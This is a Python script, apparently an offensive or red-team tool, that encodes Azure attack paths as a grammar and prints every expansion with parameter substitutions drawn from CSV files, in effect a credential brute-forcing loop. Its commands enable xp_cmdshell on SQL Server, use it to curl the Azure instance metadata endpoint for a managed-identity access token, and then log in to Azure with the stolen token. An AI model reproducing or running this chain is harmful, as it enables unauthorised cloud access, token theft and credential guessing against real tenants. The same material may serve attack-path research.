# commands -> terminal symbols (lowercase)
# id is cxx where xx is number.
# value is command
import re
from os.path import exists

commands: dict[str, str] = {
    "c10": "az login -u <username> -p <password>",
    "c11": "az login --service-principal -u <app-id> -p <password> --tenant <tenant>",
    "c20": 'Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password '
           '"<password>" -Query "EXEC master..sp_configure ‘SHOW advanced options’,1; “RECONFIGURE WITH OVERRIDE;"',
    "c21": 'Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password '
           '"<password>" -Query "EXEC master..sp_configure ‘xp_cmdshell’, 1; RECONFIGURE WITH OVERRIDE;"',
    "c22": 'Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password '
           '"<password>" -Query "EXEC master..sp_configure ‘SHOW advanced options’,0; RECONFIGURE WITH OVERRIDE;"',
    "c23": 'Invoke-Sqlcmd -ServerInstance "<sqlserver>" -Database "<database>" -Username "<username>" -Password '
           '"<password>" -Query "EXEC xp_cmdshell \'curl -H \"Metadata: true\" '
           '\"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https'
           '://management.azure.com/\"\'" | Select-String -Pattern \'^{.*}\' | ForEach-Object { $tokenObject = '
           'ConvertFrom-Json $_.Matches[0].Value; $tokenObject.access_token }',
    "c24": 'az login --service-principal -u <app-id> -p $accessToken  --tenant <tenant>'
}

# activities -> non-terminal symbols (i.e. upper-case, production rules)
# id is Axx where xx is number.
# value is tab delimited.
activities: dict[str, str] = {
    "A10": "c10 | c11",
    "A20": "c20 c21 c22 c23 c24",
}

# the starting state, i.e. S-> in cfg.
# value is tab delimited.
starting_state: str = "A10 | A20"


def convert_to_file_name(file_name: str) -> str:
    """Converts string to safe filename"""
    file_name = str(file_name).replace(" ", "-")
    return "".join(x for x in file_name if x.isalnum() or x == "-")


def execute_command(command: str) -> bool:
    """
    Executes provided command with command substitution from param files.
    Returns true if command was able to executed successfully.
    """
    # print(f"Executing command. cmd:{command}")

    pattern = re.compile(r"([\<|\[|\{\(](\S*)[\>|\]|\}|\)])", re.MULTILINE)
    matches = re.findall(pattern, command)

    parameter_names = [match[1] for match in matches if match[1]]
    number_of_params = len(parameter_names)
    param_options = []
    options_per_param = []

    # load options for parameters
    for name in parameter_names:
        file_name = "params/" + convert_to_file_name(name) + ".csv"

        # create the file if not exists
        if not exists(file_name):
            file = open(file_name, "x")
            file.close()

        file = open(file_name, "r")
        ops = [line.rstrip() for line in file]
        param_options.append(ops)
        options_per_param.append(len(ops))
        file.close()

    # attempt all until successful
    current_attempt = [0] * number_of_params
    combinations = 1
    for option_count in options_per_param:
        combinations *= option_count

    for _ in range(combinations):
        for i in range(number_of_params):
            if current_attempt[i] < options_per_param[i] - 1:
                current_attempt[i] += 1
                break
            else:
                current_attempt[i] = 0
        # print(current_attempt)
        # try sub
        words = re.split(pattern, command)
        j = 0
        for k in range(len(words)):
            word: str = words[k]
            if re.match(pattern, word):
                words[k] = param_options[j][current_attempt[j]]
                words[k + 1] = ""  # clear next
                j += 1

        full_command = "".join(words)
        print("\t> " + full_command)
        # return_code = subprocess.call(full_command, shell=True)
        # if return_code == 0:
        #     return True
        # else:
        #     return False


def expand(symbol: str, state: list[str], result: list[list[str]]) -> None:
    start_state: list[str] = state.copy()
    sub_symbols: list[str] = symbol.split()

    for i in range(len(sub_symbols)):
        sub_symbol: str = sub_symbols[i]
        sub_symbol_type: str = sub_symbol[0]
        # is last or next symbol is OR
        is_end = (i + 1 >= len(sub_symbols)) or (sub_symbols[i + 1].startswith("|"))

        if sub_symbol_type == "A":
            # we have an activity (non-terminal)
            expand(activities[sub_symbol], state.copy(), result)
        elif sub_symbol_type == "c":
            # we have a command (terminal), base case
            state.append(commands[sub_symbol])
            if is_end:
                result.append(state)

        elif sub_symbol_type == "|":
            state = start_state.copy()
        else:
            # we have an error
            raise Exception("unknown symbol type '" + sub_symbol_type + "'")


if __name__ == '__main__':
    # expand left derivation tree
    results: list[list[str]] = []
    expand(starting_state, [], results)
    for result in results:
        print("----------------------------------------------------\n")
        print("Possible attack: ")
        for command in result:
            print("\t> " + command)
        print("\n")
        print("Possible parameter substitutions: ")
        for command in result:
            execute_command(command)
        print("\n\n")
